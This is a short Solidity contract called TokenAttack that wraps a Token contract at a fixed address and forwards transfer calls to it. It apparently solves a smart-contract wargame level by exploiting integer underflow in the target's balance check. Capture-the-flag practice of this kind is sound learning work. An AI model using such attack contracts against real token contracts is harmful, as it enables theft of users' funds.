// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";
contract TokenAttack {

    Token token = Token(0x78199F2BA24fB7E46EB0581bD85E3C75C84f1Dac);

    function transfer(address _to, uint _value) public returns (bool) {
        token.transfer(_to, _value);
    }

}